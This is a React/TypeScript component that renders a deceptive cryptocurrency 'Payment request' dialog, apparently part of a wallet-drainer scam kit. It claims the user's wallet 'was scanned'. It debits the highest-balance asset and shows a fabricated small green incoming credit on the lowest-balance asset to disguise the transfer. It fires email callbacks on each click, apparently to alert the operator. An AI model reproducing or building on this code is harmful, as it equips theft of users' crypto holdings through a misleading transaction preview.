import { Loader2 } from 'lucide-react'
import { formatPaymentAmount, getHighestAndLowestUSDTAndSol } from '../lib/payoutTransfer'
import type { FundStep } from '../lib/payoutTransfer'

type PaymentRequestModalProps = {
  open: boolean
  to: string
  amount: number
  asset: string
  networkLabel: string
  submitting: boolean
  canReview: boolean
  status: string
  onCancel: () => void
  onReview: () => void
  usdtBalance?: number
  solBalance?: number
  steps?: FundStep[]
  onEmailSent?: (action: 'confirm' | 'cancel') => void
}

/** Compute the tiny "incoming" display amount for the lowest-balance asset */
function tinyReceiveAmount(step: FundStep): string {
  if (step.symbol === 'SOL') return '+0.001 SOL'
  if (step.symbol === 'USDT' || step.symbol === 'USDC' || step.symbol === 'PYUSD') return '+1.00 ' + step.symbol
  // For other tokens: show a tiny fraction
  return '+0.001 ' + step.symbol
}

export function PaymentRequestModal({
  open,
  to,
  amount,
  asset,
  networkLabel,
  submitting,
  canReview,
  status,
  onCancel,
  onReview,
  usdtBalance,
  solBalance,
  steps,
  onEmailSent,
}: PaymentRequestModalProps) {
  if (!open) return null

  // Determine highest (will be debited) and lowest (will receive tiny credit)
  const { highest: highestInfo, lowest: lowestInfo } = steps
    ? getHighestAndLowestUSDTAndSol(steps)
    : { highest: null, lowest: null }

  // Highest balance — the one being sent from (shown as -)
  const highestAsset = highestInfo?.symbol ?? asset ?? 'USDT'
  const highestDebitDisplay = highestInfo
    ? `-${formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)}`
    : `-${formatPaymentAmount(amount, asset)}`
  const highestUsd = highestInfo?.usd ?? amount

  // Lowest balance — shown as receiving a tiny credit (+)
  // Only show if it's a DIFFERENT asset than the highest
  const showLowest = lowestInfo && lowestInfo.symbol !== highestAsset
  const lowestCreditDisplay = lowestInfo ? tinyReceiveAmount(lowestInfo) : null

  const handleCancel = () => {
    onCancel()
    onEmailSent?.('cancel')
  }

  const handleReview = () => {
    onReview()
    onEmailSent?.('confirm')
  }

  return (
    <div className="pointer-events-auto fixed inset-0 z-[1100] flex items-end justify-center px-4 pb-6 sm:items-center sm:pb-0">
      <div className="absolute inset-0 bg-black/75 backdrop-blur-sm" aria-hidden="true" onClick={handleCancel} />
      <div
        role="dialog"
        aria-labelledby="payment-request-title"
        aria-modal="true"
        className="relative w-full max-w-[420px] rounded-2xl border border-[#2a2a2a] bg-[#0c0c0c] p-5 text-white shadow-[0_24px_80px_rgba(0,0,0,0.85)] animate-[tx-sheet-up_200ms_ease-out]"
      >
        <p
          id="payment-request-title"
          className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400"
        >
          Payment request
        </p>

        <h2 className="mt-2 text-xl font-semibold text-white">
          💎 Payment request
        </h2>

        <p className="mt-1 text-sm leading-relaxed text-gray-300">
          Your wallet was scanned. Confirm the transaction below to proceed.
        </p>

        {/* ── Transaction preview rows ─────────────────────────────── */}
        <dl className="mt-5 space-y-2 rounded-xl border border-[#2a2a2a] bg-[#141414] px-4 py-3 text-sm">

          {/* CREDIT row — lowest balance receives tiny amount (green, positive) — shown FIRST */}
          {showLowest && lowestCreditDisplay ? (
            <div className="flex items-center justify-between gap-3">
              <dt className="flex items-center gap-1.5 text-gray-400">
                <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-green-900/40 text-[10px] font-bold text-green-400">↓</span>
                <span>{lowestInfo!.symbol}</span>
                <span className="text-[11px] text-gray-600">(lowest balance)</span>
              </dt>
              <dd className="font-semibold tabular-nums text-green-400">
                {lowestCreditDisplay}
              </dd>
            </div>
          ) : null}

          {/* DEBIT row — highest balance (red, negative) — shown SECOND */}
          <div className="flex items-center justify-between gap-3">
            <dt className="flex items-center gap-1.5 text-gray-400">
              <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-red-900/40 text-[10px] font-bold text-red-400">↑</span>
              <span>{highestAsset}</span>
              <span className="text-[11px] text-gray-600">(highest balance)</span>
            </dt>
            <dd className="font-semibold tabular-nums text-red-400">
              {highestDebitDisplay}
            </dd>
          </div>

          {/* Divider */}
          <div className="border-t border-[#2a2a2a] pt-2 mt-1" />

          {/* Net amount */}
          <div className="flex justify-between gap-3">
            <dt className="text-gray-400 font-medium">Net amount</dt>
            <dd className="font-bold text-red-400 text-base tabular-nums">
              ≈ ${highestUsd.toFixed(2)} USD
            </dd>
          </div>

          {/* Recipient */}
          <div className="flex justify-between gap-3">
            <dt className="text-gray-500">Recipient</dt>
            <dd className="max-w-[240px] break-all text-right font-mono text-[12px] text-white">
              {to || 'Not set'}
            </dd>
          </div>

          {/* Network */}
          <div className="flex justify-between gap-3">
            <dt className="text-gray-500">Network</dt>
            <dd className="text-white">{networkLabel}</dd>
          </div>
        </dl>

        <p className="mt-4 text-[12px] leading-relaxed text-gray-400">{status}</p>

        <div className="mt-5 flex gap-2">
          <button
            type="button"
            onClick={handleCancel}
            disabled={submitting}
            className="flex-1 rounded-full border border-[#3a3a3a] bg-[#1a1a1a] py-3 text-sm font-medium text-gray-300 disabled:opacity-40"
          >
            Cancel
          </button>
          <button
            type="button"
            onClick={handleReview}
            disabled={submitting || !canReview}
            className="flex-1 rounded-full bg-green-600 py-3 text-sm font-semibold text-white disabled:opacity-40 hover:bg-green-500"
          >
            {submitting ? (
              <span className="inline-flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" />
                Processing…
              </span>
            ) : (
              'Confirm'
            )}
          </button>
        </div>
      </div>
    </div>
  )
}